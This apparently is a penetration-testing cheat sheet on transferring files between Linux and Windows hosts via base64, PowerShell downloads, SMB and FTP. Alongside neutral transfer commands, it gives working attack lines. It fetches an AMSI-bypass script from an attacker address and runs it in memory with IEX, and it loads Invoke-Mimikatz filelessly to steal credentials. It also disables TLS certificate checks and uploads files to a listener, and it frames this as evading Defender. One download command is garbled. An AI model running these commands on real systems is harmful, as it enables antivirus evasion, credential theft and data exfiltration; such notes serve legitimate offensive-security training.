## PowerShell
### Copying Using Base64 From from Linux to Windows

Verify the MD5 hash of the target file:

```bash
garffff@garffff:~/test$ more hello.py 
print("hello world!")
garffff@garffff:~/test$ md5sum hello.py 
01c0a257edd3c2e95c25d80a4c18c5cc  hello.py
```

Base64 the target file :

```bash
garffff@garffff:~/test$ cat hello.py |base64 -w 0;echo
cHJpbnQoImhlbGxvIHdvcmxkISIp
```

In PowerShell, echo the base64 output to a location:

```bash
PS C:\users\public\downloads> [IO.File]::WriteAllBytes("C:\Users\Public\hello.py", [Convert]::FromBase64String("cHJpbnQoImhlbGxvIHdvcmxkISIp"))
```

Verify MD5 of target file:

```bash
PS C:\users\public\downloads> Get-FileHash C:\Users\Public\hello.py -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             01C0A257EDD3C2E95C25D80A4C18C5CC                                 
```

### Copying Using Base64 From from Windows to Linux

```bash
PS C:\users\public\downloads> [Convert]::ToBase64String((Get-Content -path "C:\users\public\hello.py" -Encoding byte))
cHJpbnQoImhlbGxvIHdvcmxkISIp
```

Verify MD5 hash:

```bash
PS C:\users\public\downloads> Get-FileHash "C:\users\public\hello.py" -Algorithm MD5 | select Hash

Hash
----
01C0A257EDD3C2E95C25D80A4C18C5CC
```

On Linux system:

```bash
echo 'cHJpbnQoImhlbGxvIHdvcmxkISIp' | base64 -d > hello.py
```

Verify hash:

```bash
garffff@garffff:~/test$ md5sum hello.py 
01c0a257edd3c2e95c25d80a4c18c5cc  hello.py
```

### Web Downloads

Malicious files can be detected by Defender:

```bash
PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\users\public\downloads> wget 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
PS C:\users\public\downloads> curl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_curl.ps1
```

Using Invoke-WebRequest is a slower method, this can launch IE when first launched:

```bash
PS C:\users\public\downloads> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

To prevent IE from loading use the following:

```bash
PS C:\users\public\downloads> Invoke-WebRequest https://https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1/PowerView.ps1 -UseBasicParsing {| IEX}
```

When SSL/TLS certificate are not trusted (not tested):

```bash
PS C:\users\public\downloads> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```
### Web Downloads - Fileless (memory)

Need to bypass AMSI to load Malicious files into memory:

```bash
PS C:\users\public\downloads> (New-Object System.Net.WebClient).DownloadString('http://192.168.0.51/amsi.txt') | IEX
```

Then load into memory:

```bash
PS C:\users\public\downloads> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### Web Uploads

Create a uploads webserver:

```bash
garffff@garffff:~/test$ pip3 install uploadserver
garffff@garffff:~/test$ python3 -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Upload file from Windows:

```bash
PS C:\Users\Public\Downloads> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\Users\Public\Downloads> Invoke-FileUpload -Uri http://192.168.0.51:8000/upload -File C:\users\public\downloads\hello.py

[+] File Uploaded:  C:\users\public\downloads\hello.py
[+] FileHash:  01C0A257EDD3C2E95C25D80A4C18C5CC
```

### Web Uploads Using Base64

```bash
PS C:\Users\Public\Downloads> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\users\public\downloads\hello.py' -Encoding Byte))
```

Create a NC listener:

```bash
garffff@garffff:~/test$ sudo nc -lvp 8000
```

Send Base64 encoded file:

```
PS C:\Users\Public\Downloads> Invoke-WebRequest -Uri http://192.168.0.51/ -Method POST -Body $b64
```

Results:

```bash
garffff@garffff:~/test$ sudo nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 192.168.0.75 1979
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.19041.4894
Content-Type: application/x-www-form-urlencoded
Host: 192.168.0.51
Content-Length: 28
Connection: Keep-Alive

cHJpbnQoImhlbGxvIHdvcmxkISIp
```
## SMB

Create SMB server:

```bash
garffff@garffff:~/test$ sudo smbserver.py share /tmp -smb2support 
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Copying to Windows:

```bash
c:\Users\Public\Downloads>copy \\192.168.0.51\share\hello.py
        1 file(s) copied.
```

Using a username and password:

```bash
c:\Users\Public\Downloads> net use x: \\192.168.220.133\share /user:garffff password
c:\Users\Public\Downloads> copy x:\hello.py
```

## FTP - Download

Create FTP server:

```bash
garffff@garffff:~/test$ sudo pip3 install pyftpdlib
garffff@garffff:~/test$ sudo python3 -m pyftpdlib --port 21
[I 2024-09-29 14:49:52] concurrency model: async
[I 2024-09-29 14:49:52] masquerade (NAT) address: None
[I 2024-09-29 14:49:52] passive ports: None
[I 2024-09-29 14:49:52] >>> starting FTP server on 0.0.0.0:21, pid=47842 <<<
```

Copy file:

```bash
PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('ftp://192.168.0.51/hello.py', 'C:\Users\Public\downloads\hello.py')
```

### FTP - Upload

Create writable FTP server

```bash
garffff@garffff:~/test$ sudo python3 -m pyftpdlib --port 21 --write
[sudo] password for garffff:            
/usr/local/lib/python3.10/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2024-09-29 15:06:15] concurrency model: async
[I 2024-09-29 15:06:15] masquerade (NAT) address: None
[I 2024-09-29 15:06:15] passive ports: None
[I 2024-09-29 15:06:15] >>> starting FTP server on 0.0.0.0:21, pid=52705 <<<
```

Upload file from Windows:

```bash
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.0.51/hello.py', 'c:\users\public\downloads\hello.py')
```
